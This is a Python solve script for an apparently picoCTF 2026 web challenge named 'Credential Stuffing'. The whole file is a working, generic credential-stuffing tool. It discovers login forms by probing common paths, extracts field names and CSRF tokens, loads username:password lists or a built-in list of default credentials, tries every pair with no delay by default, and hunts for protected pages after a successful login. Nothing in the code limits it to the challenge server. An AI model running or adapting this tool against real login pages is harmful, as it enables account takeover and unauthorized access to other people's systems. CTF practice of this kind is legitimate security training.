#!/usr/bin/env python3
"""
Credential Stuffing - picoCTF 2026
Category: Web Exploitation (100 points)

Description: Credential stuffing is the automated injection of stolen
username and password pairs into website login forms.

This script automates login attempts using a credential list against
the challenge's login form to find valid credentials and retrieve the flag.

Usage:
    python3 solve.py --url <CHALLENGE_URL>
    python3 solve.py --url <CHALLENGE_URL> --wordlist <CREDENTIAL_FILE>

Example:
    python3 solve.py --url http://rescued-float.picoctf.net:12345
    python3 solve.py --url http://rescued-float.picoctf.net:12345 --wordlist credentials.txt
"""

import requests
import argparse
import sys
import re
import os
import time


# --- Default credential lists ---

# Common credentials to try if no wordlist is provided
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "password123"),
    ("admin", "admin123"),
    ("admin", "123456"),
    ("root", "root"),
    ("root", "password"),
    ("root", "toor"),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("guest", "guest"),
    ("administrator", "administrator"),
    ("admin", "picoctf"),
    ("picoctf", "picoctf"),
    ("ctf", "ctf"),
    ("player", "player"),
]


def load_credentials(filepath):
    """
    Load credentials from a file.
    Supports formats:
        username:password
        username,password
        username\tpassword
        username password
    """
    credentials = []
    with open(filepath, 'r', errors='replace') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            # Try different delimiters
            for delimiter in [':', ',', '\t', ' ']:
                if delimiter in line:
                    parts = line.split(delimiter, 1)
                    if len(parts) == 2:
                        credentials.append((parts[0].strip(), parts[1].strip()))
                        break
    return credentials


def discover_login_form(session, base_url):
    """
    Discover the login form by checking common endpoints and parsing HTML.
    Returns (login_url, method, field_names).
    """
    # Common login paths to try
    login_paths = [
        "/login", "/api/login", "/auth/login", "/signin", "/api/signin",
        "/authenticate", "/api/authenticate", "/", "/index.html",
        "/login.php", "/login.html",
    ]

    for path in login_paths:
        url = base_url.rstrip('/') + path
        try:
            resp = session.get(url, timeout=10, allow_redirects=True)
            if resp.status_code == 200:
                # Check for form elements in the response
                html = resp.text.lower()
                if 'password' in html or 'login' in html or '<form' in html:
                    print(f"[+] Found login page at: {url}")

                    # Try to extract form action and field names
                    action_match = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', resp.text, re.IGNORECASE)
                    action = action_match.group(1) if action_match else path

                    # Resolve relative URLs
                    if action.startswith('/'):
                        login_url = base_url.rstrip('/') + action
                    elif action.startswith('http'):
                        login_url = action
                    else:
                        login_url = base_url.rstrip('/') + '/' + action

                    # Extract input field names
                    input_fields = re.findall(
                        r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']?(password|text|email|hidden)["\']?',
                        resp.text, re.IGNORECASE
                    )
                    input_fields2 = re.findall(
                        r'<input[^>]*type=["\']?(password|text|email|hidden)["\']?[^>]*name=["\']([^"\']*)["\']',
                        resp.text, re.IGNORECASE
                    )

                    user_field = "username"
                    pass_field = "password"

                    all_fields = [(name, typ) for name, typ in input_fields] + \
                                 [(name, typ) for typ, name in input_fields2]

                    for name, typ in all_fields:
                        if typ.lower() == 'password':
                            pass_field = name
                        elif typ.lower() in ('text', 'email') and name.lower() != 'csrf':
                            user_field = name

                    # Check for CSRF token
                    csrf_token = None
                    csrf_match = re.search(
                        r'<input[^>]*name=["\'](_?csrf_?[^"\']*)["\'][^>]*value=["\']([^"\']*)["\']',
                        resp.text, re.IGNORECASE
                    )
                    if csrf_match:
                        csrf_token = (csrf_match.group(1), csrf_match.group(2))

                    # Detect method
                    method_match = re.search(r'<form[^>]*method=["\']([^"\']*)["\']', resp.text, re.IGNORECASE)
                    method = method_match.group(1).upper() if method_match else "POST"

                    return login_url, method, user_field, pass_field, csrf_token

        except requests.exceptions.RequestException:
            continue

    # Default fallback
    return base_url.rstrip('/') + "/login", "POST", "username", "password", None


def try_login(session, login_url, method, user_field, pass_field,
              username, password, csrf_token=None):
    """
    Attempt a single login and return (success, response).
    """
    data = {user_field: username, pass_field: password}

    if csrf_token:
        data[csrf_token[0]] = csrf_token[1]

    try:
        if method == "POST":
            resp = session.post(login_url, data=data, timeout=10, allow_redirects=True)
        else:
            resp = session.get(login_url, params=data, timeout=10, allow_redirects=True)
    except requests.exceptions.RequestException as e:
        return False, None

    # Check for success indicators
    body = resp.text.lower()
    success_indicators = [
        'picoctf{',           # Flag directly in response
        'flag',               # Flag reference
        'welcome',            # Successful login greeting
        'dashboard',          # Redirected to dashboard
        'logged in',          # Login confirmation
        'success',            # Generic success
    ]

    failure_indicators = [
        'invalid',            # Invalid credentials
        'incorrect',          # Incorrect password
        'denied',             # Access denied
        'failed',             # Login failed
        'error',              # Error message
        'wrong',              # Wrong password
        'try again',          # Retry prompt
    ]

    # Check if flag is directly in response
    flag_match = re.search(r'picoCTF\{[^}]+\}', resp.text)
    if flag_match:
        return True, resp

    # Check success vs failure indicators
    has_success = any(ind in body for ind in success_indicators)
    has_failure = any(ind in body for ind in failure_indicators)

    if has_success and not has_failure:
        return True, resp

    # Check for redirect to different page (potential success)
    if resp.history and resp.url != login_url:
        if not has_failure:
            return True, resp

    return False, resp


def extract_flag(response):
    """Extract picoCTF flag from HTTP response."""
    if response is None:
        return None

    # Check response body
    flag_match = re.search(r'picoCTF\{[^}]+\}', response.text)
    if flag_match:
        return flag_match.group(0)

    # Check response headers
    for header, value in response.headers.items():
        flag_match = re.search(r'picoCTF\{[^}]+\}', value)
        if flag_match:
            return flag_match.group(0)

    # Check cookies
    for cookie in response.cookies:
        flag_match = re.search(r'picoCTF\{[^}]+\}', cookie.value)
        if flag_match:
            return flag_match.group(0)

    return None


def solve(base_url, wordlist_path=None, rate_limit=0.0):
    """
    Main solve routine:
    1. Discover the login form
    2. Load credentials
    3. Attempt each credential pair
    4. Extract the flag from a successful login
    """
    session = requests.Session()

    # Step 1: Discover the login form
    print(f"[*] Discovering login form at {base_url}...")
    login_url, method, user_field, pass_field, csrf = discover_login_form(session, base_url)
    print(f"[+] Login URL: {login_url}")
    print(f"[+] Method: {method}")
    print(f"[+] Username field: {user_field}")
    print(f"[+] Password field: {pass_field}")
    if csrf:
        print(f"[+] CSRF token field: {csrf[0]}")

    # Step 2: Load credentials
    if wordlist_path and os.path.exists(wordlist_path):
        print(f"[*] Loading credentials from: {wordlist_path}")
        credentials = load_credentials(wordlist_path)
        print(f"[+] Loaded {len(credentials)} credential pairs")
    else:
        # Try to find a credentials file in the current directory or challenge page
        print("[*] No wordlist specified, looking for credential files...")
        for candidate in ['credentials.txt', 'creds.txt', 'users.txt', 'passwords.txt',
                          'wordlist.txt', 'logins.txt', 'userpass.txt']:
            if os.path.exists(candidate):
                print(f"[+] Found local file: {candidate}")
                credentials = load_credentials(candidate)
                print(f"[+] Loaded {len(credentials)} credential pairs")
                break
        else:
            # Check if the challenge page links to a downloadable file
            try:
                resp = session.get(base_url, timeout=10)
                file_links = re.findall(r'href=["\']([^"\']*(?:credentials|creds|wordlist|users|passwords)[^"\']*)["\']',
                                        resp.text, re.IGNORECASE)
                for link in file_links:
                    if link.startswith('/'):
                        file_url = base_url.rstrip('/') + link
                    elif link.startswith('http'):
                        file_url = link
                    else:
                        file_url = base_url.rstrip('/') + '/' + link

                    print(f"[*] Downloading credential file: {file_url}")
                    file_resp = session.get(file_url, timeout=10)
                    if file_resp.status_code == 200:
                        with open('credentials_downloaded.txt', 'w') as f:
                            f.write(file_resp.text)
                        credentials = load_credentials('credentials_downloaded.txt')
                        print(f"[+] Downloaded and loaded {len(credentials)} credential pairs")
                        break
                else:
                    print("[*] No credential file found. Using default list.")
                    credentials = DEFAULT_CREDENTIALS
            except Exception:
                print("[*] Using default credential list.")
                credentials = DEFAULT_CREDENTIALS

    # Step 3: Try each credential pair
    print(f"\n[*] Starting credential stuffing attack ({len(credentials)} pairs)...")
    for i, (username, password) in enumerate(credentials):
        if rate_limit > 0:
            time.sleep(rate_limit)

        success, resp = try_login(session, login_url, method, user_field,
                                  pass_field, username, password, csrf)

        if success:
            print(f"\n[+] VALID CREDENTIALS FOUND: {username}:{password}")

            # Try to extract flag
            flag = extract_flag(resp)
            if flag:
                print(f"[+] FLAG: {flag}")
                return flag

            # If no flag in immediate response, try accessing other pages
            print("[*] Login successful but flag not in response. Checking other pages...")
            flag_pages = ['/flag', '/flag.txt', '/home', '/dashboard', '/profile',
                          '/admin', '/secret', '/', '/api/flag']
            for page in flag_pages:
                try:
                    page_url = base_url.rstrip('/') + page
                    page_resp = session.get(page_url, timeout=10)
                    flag = extract_flag(page_resp)
                    if flag:
                        print(f"[+] FLAG found at {page}: {flag}")
                        return flag
                except Exception:
                    continue

            print("[*] Flag not found in common locations. Check the session manually.")
            print(f"[*] Cookies: {dict(session.cookies)}")
            return None

        # Progress indicator
        if (i + 1) % 50 == 0:
            print(f"[*] Tried {i + 1}/{len(credentials)} credentials...")

    print(f"\n[!] No valid credentials found after {len(credentials)} attempts.")
    return None


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Credential Stuffing Solver - picoCTF 2026")
    parser.add_argument("--url", required=True,
                        help="Challenge base URL (e.g., http://host:port)")
    parser.add_argument("--wordlist", type=str, default=None,
                        help="Path to credential wordlist (format: username:password per line)")
    parser.add_argument("--rate-limit", type=float, default=0.0,
                        help="Delay between attempts in seconds (default: 0)")
    args = parser.parse_args()

    flag = solve(args.url, args.wordlist, args.rate_limit)
    if flag:
        print(f"\n{'='*50}")
        print(f"FLAG: {flag}")
        print(f"{'='*50}")
    else:
        print("\n[!] Failed to retrieve flag automatically.")
        print("[*] Tips:")
        print("    - Check the challenge page for downloadable credential files")
        print("    - Inspect the login form manually with browser dev tools")
        print("    - Try adjusting --rate-limit if the server is rate-limiting")
